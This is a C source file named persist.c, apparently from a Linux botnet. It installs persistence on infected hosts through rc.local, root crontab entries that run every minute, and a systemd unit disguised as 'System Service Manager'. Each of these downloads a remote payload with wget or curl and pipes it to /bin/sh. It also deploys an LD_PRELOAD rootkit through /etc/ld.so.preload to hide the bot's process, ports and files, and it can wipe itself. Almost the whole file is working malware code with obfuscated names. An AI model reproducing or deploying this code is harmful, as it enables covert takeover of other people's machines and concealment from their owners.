/* ==========================================================================
 *  persist.c -- Persistence mechanisms
 *  Pure C port of persist.cpp.  GCC 4.1.2 / C89+C99, uClibc.
 * ========================================================================== */

#include "bot.h"

/* Prefer the resolved (IP-based) fetch URL if available, else original */
#define FETCH_URL() (ds_len(&_my6pz2j) > 0 ? &_my6pz2j : &_Xx5Rw4X)

/* Liveness check: is the bot process still running?
   Bakes our PID into the cron/rc.local command at install time.
   kill -0 just checks existence — no signals sent, no files, no ports. */
static void fz5pg5h(dstr *cmd, const char *on_alive) {
    char pid_str[16];
    snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
    ds_cat(cmd, "kill -0 ");
    ds_cat(cmd, pid_str);
    ds_cat(cmd, " 2>/dev/null && ");
    ds_cat(cmd, on_alive);
}

/* ==========================================================================
 * LOCAL HELPERS
 * ========================================================================== */

/* Generate a camouflage name: pick random camo name + "-" + random4 */
static void SR7XF5X(dstr *out) {
    char rnd[5];
    ds_init(out);
    DS4RR2W();
    random_string(rnd, 4);
    if (sa_count(&_xJ8ym8N) == 0) {
        ds_set(out, "proc-");
        ds_cat(out, rnd);
        return;
    }
    {
        size_t idx = (size_t)(urandom_u32() % sa_count(&_xJ8ym8N));
        ds_set(out, sa_get(&_xJ8ym8N, idx));
        ds_cat(out, "-");
        ds_cat(out, rnd);
    }
}

/* Copy src into dst stripping chars that break shell quoting (' " \\ space).
   Valid HTTP(S) URLs never contain these — they'd be percent-encoded. */
static void _safe_url(dstr *dst, const dstr *src) {
    const char *p = ds_cstr(src);
    ds_clear(dst);
    for (; *p; p++) {
        if (*p != '\'' && *p != '"' && *p != '\\' && *p != ' ')
            ds_catc(dst, *p);
    }
}

/* Append a line to a file */
static int _jE2MW3i(const char *path, const char *line, int perm) {
    int fd;
    fd = open(path, O_APPEND | O_WRONLY | O_CREAT, (mode_t)perm);
    if (fd < 0) return -1;
    write(fd, line, strlen(line));
    close(fd);
    return 0;
}

/* Read entire file into a dstr */
static void read_file(const char *path, dstr *out) {
    FILE *f;
    char buf[4096];
    size_t n;

    ds_init(out);
    f = fopen(path, "r");
    if (!f) return;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
        ds_catn(out, buf, n);
    }
    fclose(f);
}

/* Get executable path. Strip " (deleted)" suffix that Linux appends
   to /proc/self/exe after unlink — unquoted parens break shell syntax. */
static void _ko3XK5J(dstr *out) {
    char buf[4096];
    ssize_t len;
    char *del;
    ds_init(out);
    len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len <= 0) return;
    buf[len] = '\0';
    del = strstr(buf, " (deleted)");
    if (del) *del = '\0';
    ds_set(out, buf);
}

/* ── BusyBox-compatible crontab helpers ──
   BusyBox crontab doesn't support -l/-r/- flags.
   Fallback: read/write the crontab file directly. */
static const char *_sK8kb7W[] = {
    "/var/spool/cron/crontabs/root",
    "/var/spool/cron/root",
    "/etc/crontabs/root",
    NULL
};

static const char *_Dw2DQ7K(void) {
    int i;
    struct stat st;
    for (i = 0; _sK8kb7W[i]; i++) {
        if (stat(_sK8kb7W[i], &st) == 0)
            return _sK8kb7W[i];
    }
    for (i = 0; _sK8kb7W[i]; i++) {
        char dir[256];
        const char *slash;
        strncpy(dir, _sK8kb7W[i], sizeof(dir) - 1);
        dir[sizeof(dir) - 1] = '\0';
        slash = strrchr(dir, '/');
        if (slash) {
            dir[slash - dir] = '\0';
            if (stat(dir, &st) == 0)
                return _sK8kb7W[i];
        }
    }
    return NULL;
}

static void _Vr6LG7t(dstr *out) {
    FILE *fp;
    char buf[4096];
    dstr cmd;

    ds_init(out);
    ds_init(&cmd);
    ds_catds(&cmd, &_iG6pj2F);
    ds_cat(&cmd, " -l 2>/dev/null");
    fp = popen(ds_cstr(&cmd), "r");
    ds_free(&cmd);
    if (fp) {
        while (fgets(buf, sizeof(buf), fp))
            ds_cat(out, buf);
        if (pclose(fp) == 0 && ds_len(out) > 0)
            return;
        ds_free(out);
        ds_init(out);
    }
    {
        const char *path = _Dw2DQ7K();
        if (path) read_file(path, out);
    }
}

static void _jh7ih7i(const char *contents) {
    dstr cmd;
    int rc;

    /* Use heredoc with single-quoted delimiter — immune to single quotes,
       dollar signs, backticks etc. inside the cron job content. */
    ds_init(&cmd);
    ds_catds(&cmd, &_iG6pj2F);
    ds_cat(&cmd, " - <<'ENDCRON'\n");
    ds_cat(&cmd, contents);
    ds_cat(&cmd, "\nENDCRON");
    rc = system(ds_cstr(&cmd));
    ds_free(&cmd);
    if (rc == 0) return;

    {
        const char *path = _Dw2DQ7K();
        if (!path) path = "/var/spool/cron/crontabs/root";
        {
            char dir[256];
            const char *slash;
            strncpy(dir, path, sizeof(dir) - 1);
            dir[sizeof(dir) - 1] = '\0';
            slash = strrchr(dir, '/');
            if (slash) {
                dir[slash - dir] = '\0';
                mkdir(dir, 0755);
            }
        }
        {
            FILE *f = fopen(path, "w");
            if (f) {
                fputs(contents, f);
                fputc('\n', f);
                fclose(f);
                chmod(path, 0600);
            }
        }
    }
}

static void _et7nm7J(void) {
    dstr cmd;
    int rc;

    ds_init(&cmd);
    ds_catds(&cmd, &_iG6pj2F);
    ds_cat(&cmd, " -r 2>/dev/null");
    rc = system(ds_cstr(&cmd));
    ds_free(&cmd);
    if (rc == 0) return;

    {
        const char *path = _Dw2DQ7K();
        if (path) {
            FILE *f = fopen(path, "w");
            if (f) fclose(f);
        }
    }
}

/* Get basename from path */
static const char *basename_cstr(const char *path) {
    const char *slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

/* ==========================================================================
 * FIN7 -- rc.local persistence
 * Appends a guarded one-liner:
 *   - Checks PID file: if process is alive, does nothing
 *   - If binary exists on disk, runs it directly
 *   - If binary is missing, downloads via fetch_url (wget || curl)
 * ========================================================================== */

void Dc2YM5y(void) {
    dstr content, entry, exe;
    struct stat st;

    Ri2bh5v();
    DS4RR2W();
    iB2Zq4a();

    /* Get our own binary path */
    _ko3XK5J(&exe);
    if (ds_empty(&exe)) { ds_free(&exe); return; }

    _nS5PJ8Y("Dc2YM5y: setting up rc.local persistence via binary: %s", ds_cstr(&exe));

    if (stat(ds_cstr(&_Xw5Jp4W), &st) != 0) { ds_free(&exe); return; }

    read_file(ds_cstr(&_Xw5Jp4W), &content);

    /* Build the new entry first */
    {
        dstr safe_url;
        ds_init(&safe_url);
        _safe_url(&safe_url, FETCH_URL());
        ds_init(&entry);
        ds_cat(&entry, "([ -x ");
        ds_catds(&entry, &exe);
        ds_cat(&entry, " ] && ");
        ds_catds(&entry, &exe);
        ds_cat(&entry, " || (wget -qO- ");
        ds_catds(&entry, &safe_url);
        ds_cat(&entry, " || curl -sL ");
        ds_catds(&entry, &safe_url);
        ds_cat(&entry, ") | /bin/sh) > /dev/null 2>&1 &");
        ds_free(&safe_url);
    }

    /* Already installed? Exact match of current entry */
    if (strstr(ds_cstr(&content), ds_cstr(&entry))) {
        ds_free(&content);
        ds_free(&exe);
        ds_free(&entry);
        return;
    }

    /* Remove ALL stale entries: match by bin_label, store_dir, exe path,
       fetch URLs, or generic wget/curl|sh one-liners (same as cron cleanup) */
    {
        dstr cleaned;
        const char *p, *nl;
        ds_init(&cleaned);
        p = ds_cstr(&content);
        while (*p) {
            nl = strchr(p, '\n');
            if (!nl) nl = p + strlen(p);
            {
                size_t llen = (size_t)(nl - p);
                char *line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (strstr(line, ds_cstr(&_Cs5Qb7D)) ||
                    strstr(line, ds_cstr(&_UW4jD7J)) ||
                    strstr(line, ds_cstr(&exe)) ||
                    strstr(line, ds_cstr(&_Xx5Rw4X)) ||
                    (ds_len(&_my6pz2j) > 0 &&
                     strstr(line, ds_cstr(&_my6pz2j))) ||
                    (strstr(line, "wget") && strstr(line, "|") && strstr(line, "/bin/sh"))) {
                    /* strip old entry */
                } else {
                    ds_catn(&cleaned, p, llen);
                    ds_catc(&cleaned, '\n');
                }
                free(line);
            }
            p = (*nl) ? nl + 1 : nl;
        }

        /* Append new entry and write everything at once */
        ds_catds(&cleaned, &entry);
        ds_catc(&cleaned, '\n');
        {
            FILE *f = fopen(ds_cstr(&_Xw5Jp4W), "w");
            if (f) {
                fwrite(ds_cstr(&cleaned), 1, ds_len(&cleaned), f);
                fclose(f);
            }
        }
        chmod(ds_cstr(&_Xw5Jp4W), 0755);
        ds_free(&cleaned);
    }

    ds_free(&content);
    ds_free(&exe);
    ds_free(&entry);
}

/* ==========================================================================
 * CARBANAK -- cron backup for Zp8bU5j
 * Guarded cron entry:
 *   - Checks PID file: if process is alive, exits immediately
 *   - If binary exists on disk, runs it directly
 *   - If binary is missing, downloads via fetch_url (wget || curl)
 * ========================================================================== */

void NK6pB7A(const char *hidden_dir) {
    dstr cron_job;

    (void)hidden_dir;
    Ri2bh5v();
    DS4RR2W();
    iB2Zq4a();

    /* Cron: kill -0 guard, then fetch + run. No binary path — bot self-deletes. */
    {
        dstr safe_url;
        ds_init(&safe_url);
        _safe_url(&safe_url, FETCH_URL());
        ds_init(&cron_job);
        ds_cat(&cron_job, "* * * * * /bin/sh -c '");
        fz5pg5h(&cron_job, "exit 0; ");
        ds_cat(&cron_job, "(wget -qO- ");
        ds_catds(&cron_job, &safe_url);
        ds_cat(&cron_job, " || curl -sL ");
        ds_catds(&cron_job, &safe_url);
        ds_cat(&cron_job, ") | /bin/sh'");
        ds_cat(&cron_job, " > /dev/null 2>&1");
        ds_free(&safe_url);
    }

    _nS5PJ8Y("NK6pB7A: installing cron: %s", ds_cstr(&cron_job));

    /* Install: read existing, filter, append ours, write back.
       Uses BusyBox-compatible helpers. */
    {
        dstr existing, cleaned;
        const char *p, *nl;

        _Vr6LG7t(&existing);

        ds_init(&cleaned);
        p = ds_cstr(&existing);
        while (*p) {
            size_t llen;
            char *line;
            nl = strchr(p, '\n');
            if (!nl) nl = p + strlen(p);
            llen = (size_t)(nl - p);
            line = (char *)malloc(llen + 1);
            memcpy(line, p, llen);
            line[llen] = '\0';
            if (line[0] == '#' ||
                strstr(line, ds_cstr(&_Xx5Rw4X)) ||
                (ds_len(&_my6pz2j) > 0 &&
                 strstr(line, ds_cstr(&_my6pz2j))) ||
                strstr(line, ds_cstr(&_Cs5Qb7D)) ||
                strstr(line, ds_cstr(&_xT8zC3K)) ||
                (strstr(line, "wget") && strstr(line, "|") && strstr(line, "sh")) ||
                (strstr(line, "curl") && strstr(line, "|") && strstr(line, "sh"))) {
                /* strip */
            } else {
                ds_catn(&cleaned, p, llen);
                ds_catc(&cleaned, '\n');
            }
            free(line);
            p = (*nl) ? nl + 1 : nl;
        }

        ds_catds(&cleaned, &cron_job);

        while (!ds_empty(&cleaned) && ds_back(&cleaned) == '\n')
            ds_pop(&cleaned);

        _jh7ih7i(ds_cstr(&cleaned));

        ds_free(&existing);
        ds_free(&cleaned);
    }

    ds_free(&cron_job);
}

/* ==========================================================================
 * DRAGONFLY -- systemd persistence (GorillaBot-style)
 *
 * Simple: service downloads + runs init.sh, Restart=always loops it.
 * init.sh checks if bot is alive before doing anything.
 * Bot process is completely decoupled from the service lifecycle.
 * ========================================================================== */

int Zp8bU5j(void) {
    dstr unit_content, cmd;
    FILE *f;
    struct stat st;

    Ri2bh5v();
    iB2Zq4a();

    if (stat(ds_cstr(&_zu2uc2Y), &st) != 0) {
        /* No systemd — still install cron as primary persistence */
        NK6pB7A(NULL);
        return 0;
    }

    /* If service file already exists, don't rewrite — daemon-reload would
       restart the service and kill us if we ARE the service process. */
    if (stat(ds_cstr(&_BS3jN3L), &st) == 0) {
        _nS5PJ8Y("Zp8bU5j: service already installed, skipping");
        NK6pB7A(NULL);  /* still refresh cron */
        return 1;
    }

    _nS5PJ8Y("Zp8bU5j: service=%s fetch=%s", ds_cstr(&_BS3jN3L), ds_cstr(FETCH_URL()));

    mkdir(ds_cstr(&_UW4jD7J), 0755);

    /* Service: unconditional oneshot at boot. Restart=on-failure retries
       if wget fails (network not ready yet). No PID guard — PIDs are
       stale after reboot. Bp3Tq8Z() handles dedup.
       Cron (NK6pB7A) handles runtime persistence. */
    ds_init(&unit_content);
    ds_cat(&unit_content, "[Unit]\n");
    ds_cat(&unit_content, "Description=System Service Manager\n");
    ds_cat(&unit_content, "After=network-online.target\n");
    ds_cat(&unit_content, "Wants=network-online.target\n\n");
    ds_cat(&unit_content, "[Service]\n");
    ds_cat(&unit_content, "Type=oneshot\n");
    ds_cat(&unit_content, "ExecStart=/bin/sh -c '");
    ds_cat(&unit_content, "F=/tmp/.");
    ds_catds(&unit_content, &_Cs5Qb7D);
    ds_cat(&unit_content, "; wget -qO $F ");
    ds_catds(&unit_content, FETCH_URL());
    ds_cat(&unit_content, " || curl -sLo $F ");
    ds_catds(&unit_content, FETCH_URL());
    ds_cat(&unit_content, "; sh $F; rm -f $F'\n");
    ds_cat(&unit_content, "Restart=on-failure\n");
    ds_cat(&unit_content, "RestartSec=60\n\n");
    ds_cat(&unit_content, "[Install]\n");
    ds_cat(&unit_content, "WantedBy=multi-user.target\n");

    f = fopen(ds_cstr(&_BS3jN3L), "w");
    if (f) { fwrite(ds_cstr(&unit_content), 1, ds_len(&unit_content), f); fclose(f); }
    chmod(ds_cstr(&_BS3jN3L), 0644);

    /* Reload + enable (no --now: don't start while we're already running) */
    ds_init(&cmd);
    ds_catds(&cmd, &_zu2uc2Y);
    ds_cat(&cmd, " daemon-reload 2>/dev/null");
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    ds_init(&cmd);
    ds_catds(&cmd, &_zu2uc2Y);
    ds_cat(&cmd, " enable --now ");
    ds_catds(&cmd, &_PZ7PR8b);
    ds_cat(&cmd, " 2>/dev/null");
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    ds_free(&unit_content);

    /* Cron backup */
    NK6pB7A(NULL);

    return 1;
}

/* ==========================================================================
 * PERSIST_REFRESH -- strip existing persistence and reinstall with current
 * _Xx5Rw4X / g_bins_host values.  Called by !updatefetch after the globals
 * have been overwritten in memory.
 * ========================================================================== */

void AJ3ue7Q(void) {
    dstr cmd;

    Ri2bh5v();
    iB2Zq4a();
    _nS5PJ8Y("AJ3ue7Q: rewriting persistence with updated fetch_url");

    /* 1. Stop and remove systemd service (if any) */
    {
        struct stat st;
        if (stat(ds_cstr(&_zu2uc2Y), &st) == 0) {
            ds_init(&cmd);
            ds_catds(&cmd, &_zu2uc2Y);
            ds_cat(&cmd, " stop ");
            ds_catds(&cmd, &_PZ7PR8b);
            system(ds_cstr(&cmd));
            ds_free(&cmd);

            ds_init(&cmd);
            ds_catds(&cmd, &_zu2uc2Y);
            ds_cat(&cmd, " disable ");
            ds_catds(&cmd, &_PZ7PR8b);
            system(ds_cstr(&cmd));
            ds_free(&cmd);

            unlink(ds_cstr(&_BS3jN3L));

            ds_init(&cmd);
            ds_catds(&cmd, &_zu2uc2Y);
            ds_cat(&cmd, " daemon-reload");
            system(ds_cstr(&cmd));
            ds_free(&cmd);
        }
    }

    /* 2. Remove cron entries — match ALL our identifiers. BusyBox-safe. */
    {
        dstr existing, cleaned;
        const char *p, *nl;

        _Vr6LG7t(&existing);
        if (ds_len(&existing) > 0) {
            ds_init(&cleaned);
            p = ds_cstr(&existing);
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (line[0] == '#' ||
                    strstr(line, ds_cstr(&_Xx5Rw4X)) ||
                    (ds_len(&_my6pz2j) > 0 &&
                     strstr(line, ds_cstr(&_my6pz2j))) ||
                    strstr(line, ds_cstr(&_Cs5Qb7D)) ||
                    strstr(line, ds_cstr(&_xT8zC3K)) ||
                    (strstr(line, "wget") && strstr(line, "|") && strstr(line, "sh")) ||
                    (strstr(line, "curl") && strstr(line, "|") && strstr(line, "sh"))) {
                    /* our entry — remove */
                } else {
                    ds_catn(&cleaned, p, llen);
                    ds_catc(&cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
            while (!ds_empty(&cleaned) && ds_back(&cleaned) == '\n')
                ds_pop(&cleaned);
            if (ds_empty(&cleaned))
                _et7nm7J();
            else
                _jh7ih7i(ds_cstr(&cleaned));
            ds_free(&cleaned);
        }
        ds_free(&existing);
    }

    /* 3. Clean rc.local */
    {
        dstr rc_content;
        read_file(ds_cstr(&_Xw5Jp4W), &rc_content);
        if (!ds_empty(&rc_content)) {
            dstr rc_cleaned;
            const char *p, *nl;
            ds_init(&rc_cleaned);
            p = ds_cstr(&rc_content);
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (!strstr(line, ds_cstr(&_Cs5Qb7D)) &&
                    !strstr(line, ds_cstr(&_UW4jD7J))) {
                    ds_catn(&rc_cleaned, p, llen);
                    ds_catc(&rc_cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
            {
                FILE *f = fopen(ds_cstr(&_Xw5Jp4W), "w");
                if (f) {
                    fwrite(ds_cstr(&rc_cleaned), 1, ds_len(&rc_cleaned), f);
                    fclose(f);
                }
            }
            chmod(ds_cstr(&_Xw5Jp4W), 0755);
            ds_free(&rc_cleaned);
        }
        ds_free(&rc_content);
    }

    /* 4. Reinstall persistence with updated _Xx5Rw4X */
    if (!Zp8bU5j()) {
        /* systemd not available — use rc.local + cron directly */
        Dc2YM5y();
        NK6pB7A(NULL);
    }

    _nS5PJ8Y("AJ3ue7Q: done");
}

/* ==========================================================================
 * NUKE AND EXIT -- complete self-removal (matches Go nukeAndExit)
 * ========================================================================== */

void DB2Ve6Z(void) {
    dstr cmd, existing, cleaned, exe;

    Ri2bh5v();
    iB2Zq4a();
    _nS5PJ8Y("DB2Ve6Z: Removing all persistence");

    /* 1. Stop and remove systemd service */
    ds_init(&cmd);
    ds_catds(&cmd, &_zu2uc2Y);
    ds_cat(&cmd, " stop ");
    ds_catds(&cmd, &_PZ7PR8b);
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    ds_init(&cmd);
    ds_catds(&cmd, &_zu2uc2Y);
    ds_cat(&cmd, " disable ");
    ds_catds(&cmd, &_PZ7PR8b);
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    unlink(ds_cstr(&_BS3jN3L));

    ds_init(&cmd);
    ds_catds(&cmd, &_zu2uc2Y);
    ds_cat(&cmd, " daemon-reload");
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    /* 2. Remove cron entries — use same read logic as _Vr6LG7t() */
    _Vr6LG7t(&existing);
    {

        ds_init(&cleaned);
        {
            const char *p = ds_cstr(&existing);
            const char *nl;
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (line[0] == '#' ||
                    strstr(line, ds_cstr(&_Xx5Rw4X)) ||
                    (ds_len(&_my6pz2j) > 0 &&
                     strstr(line, ds_cstr(&_my6pz2j))) ||
                    strstr(line, ds_cstr(&_Cs5Qb7D)) ||
                    strstr(line, ds_cstr(&_xT8zC3K)) ||
                    (strstr(line, "wget") && strstr(line, "|") && strstr(line, "sh")) ||
                    (strstr(line, "curl") && strstr(line, "|") && strstr(line, "sh"))) {
                    /* strip our entry */
                } else {
                    ds_catn(&cleaned, p, llen);
                    ds_catc(&cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
        }

        /* Trim trailing newlines */
        while (!ds_empty(&cleaned) && ds_back(&cleaned) == '\n')
            ds_pop(&cleaned);

        if (ds_empty(&cleaned)) {
            ds_init(&cmd);
            ds_catds(&cmd, &_iG6pj2F);
            ds_cat(&cmd, " -r 2>/dev/null");
            system(ds_cstr(&cmd));
            ds_free(&cmd);
        } else {
            _jh7ih7i(ds_cstr(&cleaned));
        }
        ds_free(&cleaned);
    }
    ds_free(&existing);

    /* 3. Clean rc.local */
    {
        dstr rc_content;
        read_file(ds_cstr(&_Xw5Jp4W), &rc_content);
        if (!ds_empty(&rc_content)) {
            dstr rc_cleaned;
            const char *p, *nl;
            ds_init(&rc_cleaned);
            p = ds_cstr(&rc_content);
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (!strstr(line, ds_cstr(&_Cs5Qb7D)) &&
                    !strstr(line, ds_cstr(&_UW4jD7J))) {
                    ds_catn(&rc_cleaned, p, llen);
                    ds_catc(&rc_cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
            {
                FILE *f = fopen(ds_cstr(&_Xw5Jp4W), "w");
                if (f) {
                    fwrite(ds_cstr(&rc_cleaned), 1, ds_len(&rc_cleaned), f);
                    fclose(f);
                }
            }
            chmod(ds_cstr(&_Xw5Jp4W), 0755);
            ds_free(&rc_cleaned);
        }
        ds_free(&rc_content);
    }

    /* 4. Remove hidden directory */
    ds_init(&cmd);
    ds_cat(&cmd, "rm -rf ");
    ds_catds(&cmd, &_UW4jD7J);
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    /* 5. Close control port + remove lock file */
    if (_ib2tD7y >= 0) { close(_ib2tD7y); _ib2tD7y = -1; }
    unlink(ds_cstr(&_aN8Lh6d));

    /* 6. Remove rootkit if installed */
    uB5TJ8d();

    /* 7. Remove own executable */
    _ko3XK5J(&exe);
    if (!ds_empty(&exe)) unlink(ds_cstr(&exe));
    ds_free(&exe);

    _exit(0);
}

/* ==========================================================================
 * ROOTKIT — LD_PRELOAD-based process/file/port hiding
 * ========================================================================== */

/* Path where rootkit .so will be installed */
#define RK_SO_PATH "/usr/lib/libproc.so"
#define RK_PRELOAD_PATH "/etc/ld.so.preload"

/* The rootkit .so is embedded as an external symbol by the build system.
 * If not available (e.g., stripped build), these functions are no-ops.
 * To embed: xxd -i libproc.so > rootkit_blob.h, then
 *   extern unsigned char rootkit_so[];
 *   extern unsigned int rootkit_so_len;
 *
 * For now, use a runtime approach: the .so is compiled separately and
 * the bot writes it to disk from a base64 blob sent via !persist rootkit <b64>.
 */

void vF6ku2D(const char *b64_so) {
    FILE *fp;
    FILE *preload;
    char line[512];
    int already = 0;

    if (!b64_so || !b64_so[0]) {
        _nS5PJ8Y("vF6ku2D: no .so data provided");
        return;
    }

    /* Decode base64 .so blob */
    {
        dbuf so_data = _rr5LH7D(b64_so);
        if (so_data.data == NULL || so_data.len < 100) {
            _nS5PJ8Y("vF6ku2D: invalid .so data (len=%zu)", so_data.len);
            db_free(&so_data);
            return;
        }

        /* Write .so to disk */
        fp = fopen(RK_SO_PATH, "wb");
        if (!fp) {
            /* Try alternative path */
            fp = fopen("/lib/libproc.so", "wb");
        }
        if (!fp) {
            _nS5PJ8Y("vF6ku2D: cannot write .so");
            db_free(&so_data);
            return;
        }
        fwrite(so_data.data, 1, so_data.len, fp);
        fclose(fp);
        chmod(RK_SO_PATH, 0644);
        db_free(&so_data);
    }

    /* Add to /etc/ld.so.preload (system-wide) */
    preload = fopen(RK_PRELOAD_PATH, "r");
    if (preload) {
        while (fgets(line, sizeof(line), preload)) {
            if (strstr(line, "libproc.so")) { already = 1; break; }
        }
        fclose(preload);
    }

    if (!already) {
        preload = fopen(RK_PRELOAD_PATH, "a");
        if (preload) {
            fprintf(preload, "%s\n", RK_SO_PATH);
            fclose(preload);
            _nS5PJ8Y("vF6ku2D: added to ld.so.preload");
        } else {
            _nS5PJ8Y("vF6ku2D: cannot write ld.so.preload (not root?)");
            /* Fallback: set LD_PRELOAD in our own environment for children */
            setenv("LD_PRELOAD", RK_SO_PATH, 1);
        }
    }

    /* Set env vars for the rootkit to know what to hide.
     * Includes bot binary name so it's hidden from ls/find/stat. */
    {
        char pid_str[16], files_buf[256];
        dstr exe;
        _ko3XK5J(&exe);
        snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
        setenv("RK_PID", pid_str, 1);
        setenv("RK_PORTS", "42780,1080", 1);
        snprintf(files_buf, sizeof(files_buf), "libproc.so,%s,.d",
                 ds_empty(&exe) ? "" : basename_cstr(ds_cstr(&exe)));
        setenv("RK_FILES", files_buf, 1);
        ds_free(&exe);
    }

    _nS5PJ8Y("vF6ku2D: done");
}

void uB5TJ8d(void) {
    FILE *fp;
    char buf[4096];
    int len = 0;

    /* Remove .so file */
    unlink(RK_SO_PATH);
    unlink("/lib/libproc.so");

    /* Remove from ld.so.preload */
    fp = fopen(RK_PRELOAD_PATH, "r");
    if (fp) {
        char line[512];
        buf[0] = '\0';
        while (fgets(line, sizeof(line), fp)) {
            if (!strstr(line, "libproc.so")) {
                int ll = (int)strlen(line);
                if (len + ll < (int)sizeof(buf)) {
                    memcpy(buf + len, line, (size_t)ll);
                    len += ll;
                }
            }
        }
        fclose(fp);
        buf[len] = '\0';

        fp = fopen(RK_PRELOAD_PATH, "w");
        if (fp) {
            if (len > 0) fwrite(buf, 1, (size_t)len, fp);
            fclose(fp);
        }
    }

    unsetenv("LD_PRELOAD");
    unsetenv("RK_PID");
    unsetenv("RK_PORTS");
    unsetenv("RK_FILES");

    _nS5PJ8Y("uB5TJ8d: cleaned up");
}

/* Auto-deploy and activate rootkit on startup if running as root.
 * If embedded blob is available (EMBED_ROOTKIT), writes .so to disk first.
 * If .so is already on disk from a prior install, just activates it. */
void LG2Bv6i(void) {
    struct stat st;
    FILE *preload;
    char line[512];
    int already = 0;

    /* If .so not on disk, try writing embedded blob */
    if (stat(RK_SO_PATH, &st) != 0 && stat("/lib/libproc.so", &st) != 0) {
#ifdef EMBED_ROOTKIT
        /* Write embedded .so to disk */
        #include "headers/rootkit_blob.h"
        FILE *fp = fopen(RK_SO_PATH, "wb");
        if (!fp) fp = fopen("/lib/libproc.so", "wb");
        if (fp) {
            fwrite(libproc_so, 1, libproc_so_len, fp);
            fclose(fp);
            chmod(RK_SO_PATH, 0644);
            _nS5PJ8Y("LG2Bv6i: wrote embedded .so to disk");
        } else {
            _nS5PJ8Y("LG2Bv6i: cannot write .so (not root?)");
            return;
        }
#else
        _nS5PJ8Y("LG2Bv6i: .so not found and no embedded blob, skipping");
        return;
#endif
    }

    /* Check if already in ld.so.preload */
    preload = fopen(RK_PRELOAD_PATH, "r");
    if (preload) {
        while (fgets(line, sizeof(line), preload)) {
            if (strstr(line, "libproc.so")) { already = 1; break; }
        }
        fclose(preload);
    }

    if (!already) {
        preload = fopen(RK_PRELOAD_PATH, "a");
        if (preload) {
            fprintf(preload, "%s\n", RK_SO_PATH);
            fclose(preload);
        } else {
            setenv("LD_PRELOAD", RK_SO_PATH, 1);
        }
    }

    /* Set env for rootkit to know what to hide.
     * Includes bot binary name so it's hidden from userland tools. */
    {
        char pid_str[16], files_buf[256];
        dstr exe;
        _ko3XK5J(&exe);
        snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
        setenv("RK_PID", pid_str, 1);
        setenv("RK_PORTS", "42780,1080", 1);
        snprintf(files_buf, sizeof(files_buf), "libproc.so,%s,.d",
                 ds_empty(&exe) ? "" : basename_cstr(ds_cstr(&exe)));
        setenv("RK_FILES", files_buf, 1);
        ds_free(&exe);
    }

    _nS5PJ8Y("LG2Bv6i: activated (already_preloaded=%d)", already);
}
